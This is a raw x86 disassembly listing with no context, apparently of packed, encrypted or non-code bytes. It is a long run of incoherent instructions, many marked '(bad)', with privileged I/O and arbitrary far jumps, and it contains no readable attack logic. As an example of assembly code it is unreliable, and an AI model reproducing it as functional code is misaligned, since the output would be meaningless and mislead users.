  41a367:	mov    esi,0x1631e226
  41a36c:	pop    edx
  41a36d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a36e:	or     BYTE PTR [edi-0x1c6f16ac],ah
  41a374:	stos   BYTE PTR es:[edi],al
  41a375:	push   ebp
  41a376:	aaa    
  41a377:	out    0x5b,al
  41a379:	jecxz  0x41a3e8
  41a37b:	dec    ebp
  41a37c:	adc    al,0x85
  41a37e:	or     DWORD PTR [esi-0x4e196f2b],edi
  41a384:	push   0x21122591
  41a389:	lods   al,BYTE PTR ds:[esi]
  41a38a:	xor    cl,BYTE PTR [edx+0x0]
  41a38d:	and    eax,0x10f3c6c6
  41a392:	cli    
  41a393:	sbb    eax,0x60cd93cb
  41a398:	rcl    DWORD PTR [ecx],0x7a
  41a39b:	xchg   esp,eax
  41a39c:	lea    esp,[ebx+esi*1]
  41a39f:	std    
  41a3a0:	push   ss
  41a3a1:	push   cs
  41a3a2:	call   0xf19e:0xcbea2128
  41a3a9:	mov    ?,WORD PTR [ebp+0x2187bea]
  41a3af:	add    BYTE PTR [edx-0x686d1cfb],bh
  41a3b5:	daa    
  41a3b6:	in     al,dx
  41a3b7:	addr16 push ecx
  41a3b9:	dec    edx
  41a3ba:	shr    DWORD PTR [edx+0x57],1
  41a3bd:	cld    
  41a3be:	ins    BYTE PTR es:[edi],dx
  41a3bf:	loop   0x41a3c0
  41a3c1:	stc    
  41a3c2:	jmp    0x73a23a3f
  41a3c7:	inc    ebp
  41a3c8:	fistp  DWORD PTR [eax+0x78]
  41a3cb:	js     0x41a363
  41a3cd:	xor    ah,BYTE PTR [ebx+0x402db007]
  41a3d3:	adc    ch,al
  41a3d5:	out    dx,eax
  41a3d6:	mov    al,ds:0x6e878cd2
  41a3db:	jo     0x41a3d3
  41a3dd:	(bad)  
  41a3de:	mov    ebp,0x5136ee53
  41a3e3:	js     0x41a36a
  41a3e5:	and    al,BYTE PTR [esi]
  41a3e7:	fwait
  41a3e8:	inc    eax
  41a3e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3ea:	xor    eax,ecx
  41a3ec:	pop    esi
  41a3ed:	popa   
  41a3ee:	adc    al,bh
  41a3f0:	std    
  41a3f1:	cmc    
  41a3f2:	pop    ecx
  41a3f3:	mov    ch,0xfd
  41a3f5:	fmul   DWORD PTR [esi-0x6adacf7a]
  41a3fb:	jp     0x41a439
  41a3fd:	jmp    0x41a3ca
  41a3ff:	loopne 0x41a437
  41a401:	push   esp
  41a402:	push   0xb27104dd
  41a407:	dec    ecx
  41a408:	mov    esp,0xac80799a
  41a40d:	fldcw  WORD PTR [ecx]
  41a40f:	pop    ecx
  41a410:	imul   ecx,esp,0x3d
  41a413:	pop    ebp
  41a414:	adc    BYTE PTR [ecx+0x5e],0x1c
  41a418:	sub    BYTE PTR [ebx],0x54
  41a41b:	or     eax,DWORD PTR [edx]
  41a41d:	jge    0x41a3c3
  41a41f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a420:	retf   
  41a421:	inc    esp
  41a422:	pop    edi
  41a423:	imul   ebx,esi,0x824a09a9
  41a429:	(bad)  
  41a42a:	ror    cl,1
  41a42c:	or     ah,BYTE PTR [edi]
  41a42e:	sub    eax,0xba636fdc
  41a433:	les    edx,FWORD PTR [esi+edx*1-0x4f]
  41a437:	xchg   ebx,eax
  41a438:	shl    al,1
  41a43a:	ds jge 0x41a3d1
  41a43d:	push   cs
  41a43e:	test   DWORD PTR [edx],edi
  41a440:	mov    bl,0xd0
  41a442:	cmp    eax,0x2a9ad109
  41a447:	popa   
  41a448:	sbb    bl,ch
  41a44a:	dec    edx
  41a44b:	stc    
  41a44c:	inc    ebx
  41a44d:	inc    ebp
  41a44e:	in     eax,0x36
  41a450:	mov    ds:0xd6694670,eax
  41a455:	int3   
  41a456:	fucomip st,st(0)
  41a458:	lea    edi,[esi-0x7c]
  41a45b:	adc    bl,dl
  41a45d:	mov    dl,0x2c
  41a45f:	sub    eax,0x56f60cd6
  41a464:	ud0    edx,DWORD PTR [ecx+0x3c89d43d]
  41a46b:	push   0x0
  41a46d:	xlat   BYTE PTR ds:[ebx]
  41a46e:	push   edx
  41a46f:	push   ss
  41a470:	(bad)  [ecx+eiz*2-0x29920bc5]
  41a477:	mov    ah,0x13
  41a479:	test   eax,0x509078ac
  41a47e:	test   al,0x26
  41a480:	xor    bl,BYTE PTR [edx+0x5]
  41a483:	mov    edi,0xdb4cdab3
  41a488:	cwde   
  41a489:	or     DWORD PTR [edx+0x7c],ecx
  41a48c:	das    
  41a48d:	leave  
  41a48e:	sbb    BYTE PTR [eax],0x47
  41a491:	aas    
  41a492:	ret    
  41a493:	cmp    eax,0x50c8fa5b
  41a498:	pushf  
  41a499:	xchg   BYTE PTR [edx+0x133dcbcb],bh
  41a49f:	stos   BYTE PTR es:[edi],al
  41a4a0:	adc    BYTE PTR [edi+eiz*4-0x72c5b717],bl
  41a4a7:	dec    esi
  41a4a8:	xlat   BYTE PTR ds:[ebx]
  41a4a9:	repnz (bad) 
  41a4ab:	xor    BYTE PTR [ebp+0x8aa8335],ch
  41a4b1:	dec    eax
  41a4b2:	pop    ebp
  41a4b3:	int    0x74
  41a4b5:	sub    edi,ecx
  41a4b7:	mov    cl,0x3f
  41a4b9:	repnz xchg ecx,eax
  41a4bb:	pop    es
  41a4bc:	clc    
  41a4bd:	aaa    
  41a4be:	push   esi
  41a4bf:	popf   
  41a4c0:	loop   0x41a4a7
  41a4c2:	cmc    
  41a4c3:	test   al,0xf
  41a4c5:	sub    al,0x80
  41a4c7:	jns    0x41a4a5
  41a4c9:	jae    0x41a493
  41a4cb:	push   edx
  41a4cc:	push   ss
  41a4cd:	cli    
  41a4ce:	jle    0x41a48f
  41a4d0:	xchg   ebx,eax
  41a4d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4d2:	push   ss
  41a4d3:	jl     0x41a4e1
  41a4d5:	jmp    0x41a52c
  41a4d7:	inc    eax
  41a4d8:	jbe    0x41a461
  41a4da:	fstp   TBYTE PTR [eax]
  41a4dc:	lea    edx,[esp+ebp*1]
  41a4df:	push   es
  41a4e0:	jle    0x41a481
  41a4e2:	out    0x49,eax
  41a4e4:	inc    ecx
  41a4e5:	lods   al,BYTE PTR ds:[esi]
  41a4e6:	sbb    bh,cl
  41a4e8:	pop    ss
  41a4e9:	push   es
  41a4ea:	into   
  41a4eb:	stc    
  41a4ec:	mov    ds:0xa15a515f,al
  41a4f1:	les    ebx,FWORD PTR [edi]
  41a4f3:	in     eax,dx
  41a4f4:	jne    0x41a477
  41a4f6:	sbb    DWORD PTR [ecx],ebp
  41a4f8:	sub    eax,0x5e
  41a4fb:	loope  0x41a576
  41a4fd:	leave  
  41a4fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4ff:	repz push ss
  41a501:	jnp    0x41a4b1
  41a503:	comiss xmm0,xmm4
  41a506:	out    dx,al
  41a507:	sbb    DWORD PTR [ebp+0x2b9d6996],0x16fe11a3
  41a511:	xor    esi,DWORD PTR [esi+0x16cf9302]
  41a517:	xor    ebx,DWORD PTR [eax+ebp*8+0x50]
  41a51b:	es dec edx
  41a51d:	(bad)  
  41a51e:	jns    0x41a536
  41a520:	lahf   
  41a521:	pop    ds
  41a522:	jmp    0x44ee:0x90b8e5a3
  41a529:	fucom  st(1)
  41a52b:	test   al,0x87
  41a52d:	cwde   
  41a52e:	popa   
  41a52f:	add    al,0x6b
  41a531:	sar    ebp,cl
  41a533:	jmp    0x2453:0xe0f2bd80
  41a53a:	mov    dl,0x58
  41a53c:	dec    edx
  41a53d:	lods   eax,DWORD PTR ds:[esi]
  41a53e:	push   eax
  41a53f:	add    esp,ebx
  41a541:	ficomp DWORD PTR [ebx-0xd]
  41a544:	mov    BYTE PTR [eax+ecx*4],al
  41a547:	ret    
  41a548:	daa    
  41a549:	outs   dx,DWORD PTR ds:[esi]
  41a54a:	daa    
  41a54b:	push   edi
  41a54c:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a54e:	dec    esp
  41a54f:	call   0xb1524829
  41a554:	xor    bl,BYTE PTR [ebp-0x27f09a8b]
  41a55a:	dec    esp
  41a55b:	jb     0x41a535
  41a55d:	into   
  41a55e:	pop    ds
  41a55f:	pop    ss
  41a560:	sub    eax,0x66475c59
  41a565:	dec    ebp
  41a566:	hlt    
  41a567:	sub    eax,DWORD PTR [ecx-0x53]
  41a56a:	ret    
  41a56b:	leave  
  41a56c:	adc    al,0xf0
  41a56e:	mov    cl,al
  41a570:	jns    0x41a4f9
  41a572:	xchg   edx,eax
  41a573:	mov    al,ds:0xb43f501a
  41a578:	test   bl,dl
  41a57a:	push   esi
  41a57b:	pop    eax
  41a57c:	jge    0x41a5b5
  41a57e:	fist   WORD PTR [ecx-0x6e6ec4ac]
  41a584:	dec    cx
  41a586:	int3   
  41a587:	idiv   BYTE PTR [ecx]
  41a589:	in     eax,dx
  41a58a:	mov    ebp,0x1ece8b26
  41a58f:	jbe    0x41a5ec
  41a591:	cmc    
  41a592:	outs   dx,BYTE PTR ds:[esi]
  41a593:	mov    gs,WORD PTR [edi+0x3888f7c6]
  41a599:	jns    0x41a540
  41a59b:	dec    edx
  41a59c:	aas    
  41a59d:	jge    0x41a59c
  41a59f:	mov    ds:0x38fb3845,eax
  41a5a4:	pop    es
  41a5a5:	inc    eax
  41a5a6:	cmp    eax,DWORD PTR [edi+0x77]
  41a5a9:	jge    0x41a5f6
  41a5ab:	xchg   esp,eax
  41a5ac:	or     ecx,DWORD PTR ds:0x487725f7
  41a5b2:	xchg   esp,eax
  41a5b3:	xchg   edi,eax
  41a5b4:	test   al,0x29
  41a5b6:	mov    dl,0x6c
  41a5b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5b9:	addr16 hlt 
  41a5bb:	adc    BYTE PTR [ebx+0x1a],cl
  41a5be:	test   al,0xde
  41a5c0:	in     al,0xde
  41a5c2:	and    eax,0x2c5c07a8
  41a5c7:	es sub edx,edx
  41a5ca:	cmc    
  41a5cb:	cmp    eax,0x4783d671
  41a5d0:	xchg   esp,eax
  41a5d1:	xchg   esp,eax
  41a5d2:	stc    
  41a5d3:	clc    
  41a5d4:	add    BYTE PTR [edi+0x14],cl
  41a5d7:	push   ds
  41a5d8:	xbegin 0xc5c714f6
  41a5de:	sub    ch,BYTE PTR [eax+0x77]
  41a5e1:	mov    bh,BYTE PTR [edx-0x32a170b1]
  41a5e7:	jmp    0x845a:0x638fc47c
  41a5ee:	out    dx,al
  41a5ef:	fs jecxz 0x41a648
  41a5f2:	push   cs
  41a5f3:	add    DWORD PTR [esi],ebp
  41a5f5:	sbb    edx,DWORD PTR [edi+0x71d44b30]
  41a5fb:	aaa    
  41a5fc:	push   DWORD PTR [edx+0x19]
  41a5ff:	jno    0x41a5ba
  41a601:	mov    ecx,0x94cf6d58
  41a606:	and    al,0x6b
  41a608:	jne    0x41a5fa
  41a60a:	inc    esp
  41a60b:	in     eax,dx
  41a60c:	and    BYTE PTR [esi-0x3f19b80b],0x1e
  41a613:	mov    esi,edi
  41a615:	outs   dx,DWORD PTR ds:[esi]
  41a616:	cli    
  41a617:	js     0x41a59d
  41a619:	call   0x7899523
  41a61e:	xor    al,0x5f
  41a620:	xor    BYTE PTR [ecx],dl
  41a622:	add    eax,0x490c5a51
  41a627:	mov    cl,0xc9
  41a629:	in     al,0x7e
  41a62b:	jae    0x41a5e4
  41a62d:	pop    ebx
  41a62e:	push   cs
  41a62f:	xlat   BYTE PTR ds:[ebx]
  41a630:	dec    eax
  41a631:	add    al,0x8f
  41a633:	push   ebp
  41a634:	xor    DWORD PTR [eax+ecx*1-0x68],edi
  41a638:	cmp    DWORD PTR [ebp-0x15],0x18587ecc
  41a63f:	mov    dh,0x56
  41a641:	jl     0x41a5d8
  41a643:	dec    edx
  41a644:	sbb    eax,DWORD PTR [esi+ebp*4]
  41a647:	cmp    BYTE PTR [edi+0x3f],bl
  41a64a:	sbb    ch,ah
  41a64c:	or     ebx,DWORD PTR [eax-0x161a9266]
  41a652:	pop    ebp
  41a653:	sbb    ch,BYTE PTR [eax-0x27]
  41a656:	imul   ebx,DWORD PTR [ecx+0x8],0x9d16a964
  41a65d:	inc    eax
  41a65e:	xor    BYTE PTR [edx+0x3e098d23],dh
  41a664:	mov    BYTE PTR [ebp+edi*2+0x3e9442dd],dh
  41a66b:	aam    0x56
  41a66d:	(bad)  
  41a66e:	out    0x31,al
  41a670:	std    
  41a671:	and    al,0x1d
  41a673:	(bad)  
  41a674:	and    ebp,ecx
  41a676:	dec    edx
  41a677:	xchg   ebx,eax
  41a678:	sub    bh,BYTE PTR [ebx+ebx*4-0x7e0d4ca7]
  41a67f:	mov    ds:0x6648dd01,al
  41a684:	add    DWORD PTR [edx+0x3de0f8f0],esp
  41a68a:	sub    ecx,DWORD PTR [ebx]
  41a68c:	push   ebx
  41a68d:	mov    esi,0xae7a36e3
  41a692:	data16 jp 0x41a66c
  41a695:	mov    edi,0x7f7e6e76
  41a69a:	mov    ebp,0xbfa16481
  41a69f:	fmul   DWORD PTR [esi+0x4b52395e]
  41a6a5:	test   eax,0xb6b4a41a
  41a6aa:	push   cs
  41a6ab:	int3   
  41a6ac:	dec    esp
  41a6ad:	lahf   
  41a6ae:	mov    edx,0x6e2f5d35
  41a6b3:	add    eax,0xbf25e652
  41a6b8:	mov    WORD PTR [esi],fs
  41a6ba:	arpl   WORD PTR [ecx-0x26],bx
  41a6bd:	popf   
  41a6be:	mov    ebp,0x4cca02a3
  41a6c3:	push   ecx
  41a6c4:	jecxz  0x41a69b
  41a6c6:	add    edx,eax
  41a6c8:	shl    BYTE PTR [ecx+esi*2+0x60],cl
  41a6cc:	push   ss
  41a6cd:	jmp    0x8239:0x3ee3198e
  41a6d4:	jne    0x41a678
  41a6d6:	cmp    al,0x14
  41a6d8:	fld    st(4)
  41a6da:	dec    esp
  41a6db:	pop    ebp
  41a6dc:	addr16 (bad) 
  41a6de:	pop    esi
  41a6df:	(bad)  
  41a6e0:	adc    eax,0x6dfc58b1
  41a6e5:	bound  ebx,QWORD PTR [esi+eax*4]
  41a6e8:	mov    ds:0xbbb4952c,al
  41a6ed:	cmp    BYTE PTR [eax],0x96
  41a6f0:	or     DWORD PTR [ecx-0x53],ebx
  41a6f3:	test   al,0xcf
  41a6f5:	add    BYTE PTR [edi],ah
  41a6f7:	xchg   esp,eax
  41a6f8:	fstp   st(3)
  41a6fa:	test   DWORD PTR [edi],edx
  41a6fc:	adc    DWORD PTR [ecx],ebx
  41a6fe:	jne    0x41a6bf
  41a700:	jnp    0x41a746
  41a702:	mov    al,0x26
  41a704:	mov    BYTE PTR [ebx],dh
  41a706:	mov    eax,0xac44cac4
  41a70b:	mov    al,ds:0xdb2d00bb
  41a710:	inc    ebx
  41a711:	frstpm(287 only) 
  41a713:	jns    0x41a6bd
  41a715:	mov    esi,0x26259c44
  41a71a:	dec    esi
  41a71b:	jnp    0x41a732
  41a71d:	mul    DWORD PTR [ebp-0x9]
  41a720:	imul   ecx,eax,0xc0746d04
  41a726:	icebp  
  41a727:	and    bh,BYTE PTR [edi-0xb40c3b8]
  41a72d:	retf   0x623
  41a730:	imul   esp,DWORD PTR [ebx+0x2d72e6c8],0x4fb95ef2
  41a73a:	clc    
  41a73b:	fimul  WORD PTR [ebx+0x54]
  41a73e:	out    dx,eax
  41a73f:	lock cmp ebx,ebp
  41a742:	and    DWORD PTR [eax-0x5e],0xdcaa6907
  41a749:	dec    edx
  41a74a:	dec    esi
  41a74b:	add    al,0xe5
  41a74d:	jae    0x41a727
  41a74f:	test   DWORD PTR cs:[edx],edx
  41a752:	idiv   eax
  41a754:	or     DWORD PTR [edi+ebp*2-0x40],esp
  41a758:	mov    edi,0x12d2a525
  41a75d:	jmp    0x41a78a
  41a75f:	pop    esi
  41a760:	fdivp  st(0),st
  41a762:	into   
  41a763:	adc    ecx,0x4
  41a766:	mov    bh,0x46
  41a768:	mov    dh,0xb
  41a76a:	leave  
  41a76b:	pop    edx
  41a76c:	int    0xa2
  41a76e:	fistp  DWORD PTR [ecx+0x3]
  41a771:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a772:	dec    ebp
  41a773:	scas   al,BYTE PTR es:[edi]
  41a774:	sbb    BYTE PTR [ebx-0x7cf417a9],0xe5
  41a77b:	addr16 sbb edx,eax
  41a77e:	scas   eax,DWORD PTR es:[edi]
  41a77f:	hlt    
  41a780:	sbb    ah,BYTE PTR [ebp+0x4b76b2d1]
  41a786:	mov    dh,0xb9
  41a788:	fnsave [eax+0x54]
  41a78b:	xor    bl,BYTE PTR [esi]
  41a78d:	outs   dx,BYTE PTR ds:[esi]
  41a78e:	nop
  41a78f:	or     al,BYTE PTR [ebp-0x23]
  41a792:	dec    eax
  41a793:	push   esp
  41a794:	fiadd  DWORD PTR [esi+0x38ad3fb]
  41a79a:	jnp    0x41a7d2
  41a79c:	aaa    
  41a79d:	xor    edi,DWORD PTR [eax+0xc]
  41a7a0:	loopne 0x41a743
  41a7a2:	pusha  
  41a7a3:	sbb    DWORD PTR [ebp+0x42],esp
  41a7a6:	add    BYTE PTR [edx+0x6949ca0d],bl
  41a7ac:	cmp    al,0x11
  41a7ae:	(bad)  
  41a7af:	loopne 0x41a75d
  41a7b1:	(bad)  
  41a7b2:	cmp    bh,BYTE PTR [esi]
  41a7b4:	ss jo  0x41a831
  41a7b7:	mov    bl,0xc2
  41a7b9:	outs   dx,DWORD PTR ds:[esi]
  41a7ba:	cmp    DWORD PTR [esi-0x4f],edx
  41a7bd:	mov    WORD PTR [ebp+0x4a],ss
  41a7c0:	pusha  
  41a7c1:	adc    cl,BYTE PTR [edi-0x31]
  41a7c4:	xor    eax,0x58f8b0be
  41a7c9:	or     BYTE PTR [ecx+ecx*4],0x6d
  41a7cd:	push   ebx
  41a7ce:	cmp    ah,BYTE PTR [ecx+esi*1+0x74]
  41a7d2:	les    ecx,FWORD PTR [edx-0x1a73f04a]
  41a7d8:	sti    
  41a7d9:	cdq    
  41a7da:	mov    ds:0xcc652bff,eax
  41a7df:	lea    edx,[eax]
  41a7e1:	push   ecx
  41a7e2:	mov    eax,ds:0x2f7956d8
  41a7e7:	sbb    al,al
  41a7e9:	xlat   BYTE PTR ds:[ebx]
  41a7ea:	inc    edi
  41a7eb:	ins    BYTE PTR es:[edi],dx
  41a7ec:	pushf  
  41a7ed:	in     eax,0xc5
  41a7ef:	push   edi
  41a7f0:	jb     0x41a803
  41a7f2:	add    al,0xcc
  41a7f4:	jnp    0x41a7c4
  41a7f6:	icebp  
  41a7f7:	(bad)  
  41a7f9:	mov    WORD PTR [esi+ebp*2+0xc44963d],?
  41a800:	cli    
  41a801:	add    al,0x3
  41a803:	mov    ecx,DWORD PTR [esi]
  41a805:	stos   BYTE PTR es:[edi],al
  41a806:	sub    esi,DWORD PTR [ebp+0x33b83ebd]
  41a80c:	jb     0x41a7b3
  41a80e:	jne    0x41a7f6
  41a810:	mov    gs,esp
  41a812:	pop    esp
  41a813:	and    DWORD PTR [ebx+ebx*2-0x5f],ebx
  41a817:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a818:	mov    ch,0xbe
  41a81a:	jmp    DWORD PTR [ecx+ebp*4-0x637bc99b]
  41a821:	cmp    al,0x9
  41a823:	pop    ebp
  41a824:	sbb    bh,BYTE PTR [ebx]
  41a826:	jmp    FWORD PTR [esi-0x69]
  41a829:	sbb    eax,0x4ef3a40a
  41a82e:	rcr    BYTE PTR [ebp+0x48d33daf],cl
  41a834:	mov    edi,0x9616ba8f
  41a839:	mov    ah,0x44
  41a83b:	push   ss
  41a83c:	cwde   
  41a83d:	pop    edx
  41a83e:	xchg   ecx,eax
  41a83f:	jb     0x41a808
  41a841:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a842:	mov    al,ds:0xee788843
  41a847:	pop    ebp
  41a848:	push   esi
  41a849:	mov    esi,0x2c8f9a85
  41a84e:	cmp    edx,ebp
  41a850:	adc    bl,dl
  41a852:	ins    BYTE PTR es:[edi],dx
  41a853:	leave  
  41a854:	xor    ebx,eax
  41a856:	mov    ds:0x7ba2be8f,al
  41a85b:	iret   
  41a85c:	mov    esi,DWORD PTR [ebx-0x18]
  41a85f:	push   ecx
  41a860:	icebp  
  41a861:	sar    DWORD PTR [ecx],1
  41a863:	or     esi,DWORD PTR [edx-0x13]
  41a866:	sub    esp,DWORD PTR ds:0xb267ad72
  41a86c:	popf   
  41a86d:	jmp    0x66568cdd
  41a872:	jnp    0x41a8a5
  41a874:	or     al,0x3c
  41a876:	mov    ebp,0x410578ee
  41a87b:	mov    ds:0x1535234c,al
  41a880:	div    BYTE PTR [ebp+0x25]
  41a883:	dec    edx
  41a884:	inc    ebx
  41a885:	inc    edx
  41a886:	and    al,0x58
  41a888:	and    edx,DWORD PTR [ecx+0x3872a2ee]
  41a88e:	lods   al,BYTE PTR ds:[esi]
  41a88f:	xchg   DWORD PTR [ebx+0x1b],ebx
  41a892:	vpavgb xmm0,xmm2,XMMWORD PTR [edi]
  41a896:	in     eax,dx
  41a897:	cmp    BYTE PTR [edx-0x4aef4312],0x31
  41a89e:	lock add edx,DWORD PTR [ebx]
  41a8a1:	shl    cl,cl
  41a8a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8a4:	jp     0x41a8ed
  41a8a6:	test   DWORD PTR [ecx-0xe],ebp
  41a8a9:	mov    edx,0x187509ac
  41a8ae:	dec    ecx
  41a8af:	mov    ?,WORD PTR [eax]
  41a8b1:	and    ch,BYTE PTR [ecx]
  41a8b3:	je     0x41a852
  41a8b5:	and    al,0x6d
  41a8b7:	cwde   
  41a8b8:	stc    
  41a8b9:	cmp    eax,0x840de28d
  41a8be:	and    al,0x2c
  41a8c0:	mov    edx,0x6efbaee1
  41a8c5:	fnstenv [ecx-0x6c]
  41a8c8:	pusha  
  41a8c9:	jmp    0x7d6fd434
  41a8ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8cf:	inc    ebx
  41a8d0:	daa    
  41a8d1:	xchg   edx,eax
  41a8d2:	(bad)  
  41a8d3:	pop    ebx
  41a8d4:	ret    0x831f
  41a8d7:	(bad)  [edi+0x7d2e1dba]
  41a8dd:	sbb    ecx,DWORD PTR [ebx-0x4c]
  41a8e0:	ins    DWORD PTR es:[edi],dx
  41a8e1:	sbb    al,0x40
  41a8e3:	pop    eax
  41a8e4:	loopne 0x41a934
  41a8e6:	inc    edi
  41a8e7:	mov    eax,0x9ea93b41
  41a8ec:	lods   al,BYTE PTR ds:[esi]
  41a8ed:	mov    ebp,0x49300a0e
  41a8f2:	fild   DWORD PTR [edx-0x8da9432]
  41a8f8:	push   eax
  41a8f9:	in     al,dx
  41a8fa:	dec    eax
  41a8fb:	(bad)  
  41a8fc:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41a8fe:	xchg   ecx,eax
  41a8ff:	dec    ebx
  41a900:	or     ecx,DWORD PTR [edx+0x1b]
  41a903:	jmp    0x98fa01ed
  41a908:	xor    al,0x2e
  41a90a:	imul   esi,DWORD PTR [ecx],0x65
  41a90d:	mov    bl,0x66
  41a90f:	jae    0x41a941
  41a911:	or     eax,0x2113e34b
  41a916:	xchg   DWORD PTR [ebx+0x9ce3ff6],edx
  41a91c:	in     eax,dx
  41a91d:	les    edi,FWORD PTR [edi+0x1c]
  41a920:	or     ecx,DWORD PTR [ecx+0x15aece45]
  41a926:	dec    esi
  41a927:	dec    ebx
  41a928:	adc    BYTE PTR [edi],ch
  41a92a:	repnz mov ebx,0x705e843f
  41a930:	add    ah,ah
  41a932:	or     bh,BYTE PTR [ebp+0x3eb49633]
  41a938:	sbb    eax,0xf792c0bb
  41a93d:	jne    0x41a9b2
  41a93f:	cli    
  41a940:	loop   0x41a951
  41a942:	jae    0x41a963
  41a944:	stos   DWORD PTR es:[edi],eax
  41a945:	les    edi,FWORD PTR [esi+0x463fd832]
  41a94b:	and    eax,0x17f9a64
  41a950:	dec    ebp
  41a951:	pop    ds
  41a952:	jp     0x41a910
  41a954:	mov    ah,ah
  41a956:	mov    edi,0x6588208d
  41a95b:	mov    esi,0xf0074800
  41a960:	xor    cl,dh
  41a962:	pop    es
  41a963:	cdq    
  41a964:	enter  0x5057,0x38
  41a968:	loopne 0x41a902
  41a96a:	imul   ecx,esp,0x97a3b85e
  41a970:	stc    
  41a971:	iret   
  41a972:	lock adc dl,0x13
  41a976:	mov    WORD PTR [ebp-0x6f],cs
  41a979:	retf   0x3042
  41a97c:	(bad)  
  41a97d:	and    al,0x30
  41a97f:	imul   DWORD PTR [ebx+ebp*8]
  41a982:	pop    eax
  41a983:	sub    al,0xbd
  41a985:	cmp    esp,edx
  41a987:	jmp    0x825d:0xf422c958
  41a98e:	xchg   esi,eax
  41a98f:	shl    BYTE PTR [ebx-0x2],1
  41a992:	rcr    DWORD PTR [esi+0x2c],cl
  41a995:	xlat   BYTE PTR ds:[ebx]
  41a996:	rcr    dh,cl
  41a998:	sub    eax,0x5fef9f65
  41a99d:	les    esp,FWORD PTR fs:[eax]
  41a9a0:	jne    0x41a984
  41a9a2:	dec    esp
  41a9a3:	jae    0x41a951
  41a9a5:	icebp  
  41a9a6:	call   0x7e2c2cc3
  41a9ab:	pop    ss
  41a9ac:	repnz das 
  41a9ae:	sbb    BYTE PTR [edx],bl
  41a9b0:	sbb    edi,DWORD PTR [eax]
  41a9b2:	fs jo  0x41aa0b
  41a9b5:	call   0xd89b44cf
  41a9ba:	adc    DWORD PTR [ecx],ebp
  41a9bc:	pop    ebx
  41a9bd:	fcomi  st,st(3)
  41a9bf:	imul   ecx,ecx,0x19
  41a9c2:	add    BYTE PTR [edi],dh
  41a9c4:	and    BYTE PTR [ecx+0x6cf007ad],dh
  41a9ca:	dec    edx
  41a9cb:	in     eax,dx
  41a9cc:	cdq    
  41a9cd:	sub    eax,0x714a3d30
  41a9d2:	push   0x3e676e40
  41a9d7:	ffree  st(5)
  41a9d9:	inc    eax
  41a9da:	cmc    
  41a9db:	cmp    dh,BYTE PTR [esi]
  41a9dd:	add    BYTE PTR [esi],0xdc
  41a9e0:	push   esi
  41a9e1:	mov    bh,0xc8
  41a9e3:	jmp    0xd74a:0x5982ce08
  41a9ea:	test   ebp,ecx
  41a9ec:	adc    ebx,DWORD PTR [eax+0x2e390fa0]
  41a9f2:	mov    bh,bh
  41a9f4:	xor    BYTE PTR [edi],0xf0
  41a9f7:	inc    BYTE PTR [eax+esi*8-0x1d]
  41a9fb:	cli    
  41a9fc:	test   al,0xd1
  41a9fe:	adc    ch,BYTE PTR [ecx]
  41aa00:	pop    edi
  41aa01:	enter  0x212b,0x5f
  41aa05:	sar    DWORD PTR [ebx],cl
  41aa07:	gs hlt 
  41aa09:	mov    edx,0x8c1891cb
  41aa0e:	jmp    0x41aa5b
  41aa10:	mov    BYTE PTR [ebx-0x5e],0x7
  41aa14:	iret   
  41aa15:	ja     0x41a99f
  41aa17:	es jp  0x41a9f0
  41aa1a:	ja     0x41aa0b
  41aa1c:	int    0x5c
  41aa1e:	mov    ch,0x32
  41aa20:	mov    DWORD PTR [eax-0x3dc35296],ecx
  41aa26:	js     0x41aa65
  41aa28:	cwde   
  41aa29:	dec    edx
  41aa2a:	rcl    BYTE PTR [edi],cl
  41aa2c:	out    0xde,al
  41aa2e:	mov    ecx,0xcb75b5ba
  41aa33:	div    DWORD PTR [eax+0x6c]
  41aa36:	xor    ecx,DWORD PTR [eax]
  41aa38:	add    al,0x44
  41aa3a:	or     eax,0x18f543c
  41aa3f:	xor    DWORD PTR [ebx],ecx
  41aa41:	int    0x9e
  41aa43:	(bad)  
  41aa44:	mov    eax,ds:0x5b38bba2
  41aa49:	push   0xaad287e4
  41aa4e:	xlat   BYTE PTR ds:[ebx]
  41aa4f:	mov    al,ds:0x940fb55a
  41aa54:	adc    DWORD PTR [edx-0x40],0x63a4d334
  41aa5b:	inc    eax
  41aa5c:	enter  0x492d,0xa4
  41aa60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa61:	push   0x53293e77
  41aa66:	aaa    
  41aa67:	(bad)  
  41aa68:	mov    ds,WORD PTR [ecx]
  41aa6a:	int    0x12
  41aa6c:	dec    edi
  41aa6d:	pop    esp
  41aa6e:	and    eax,0xc89645c6
  41aa73:	add    eax,0x40f00291
  41aa78:	in     al,0x13
  41aa7a:	jmp    0x1fd5:0x690c5a74
  41aa81:	lods   eax,DWORD PTR ds:[esi]
  41aa82:	scas   eax,DWORD PTR es:[edi]
  41aa83:	push   edi
  41aa84:	pop    ds
  41aa85:	adc    BYTE PTR [esi+edx*2+0x2c],cl
  41aa89:	pop    esp
  41aa8a:	jmp    0x9157:0x85bb035c
  41aa91:	cmp    edi,DWORD PTR [eax+0x3207e03b]
  41aa97:	mov    cl,dh
  41aa99:	jno    0x41aa29
  41aa9b:	pop    esp
  41aa9c:	mov    cs,WORD PTR [edi]
  41aa9e:	dec    ebp
  41aa9f:	push   edx
  41aaa0:	(bad)  
  41aaa2:	push   ebx
  41aaa3:	adc    esp,DWORD PTR [edi+0x1dda7688]
  41aaa9:	cdq    
  41aaaa:	ret    0xfdd8
  41aaad:	push   ds
  41aaae:	(bad)  
  41aaaf:	pop    ss
  41aab0:	stc    
  41aab1:	sub    bh,BYTE PTR [edi-0x28]
  41aab4:	cmp    BYTE PTR [ecx],ch
  41aab6:	not    DWORD PTR [edx]
  41aab8:	or     esi,DWORD PTR [ecx-0x56ed88f]
  41aabe:	xor    dl,0xa7
  41aac1:	repnz dec ebx
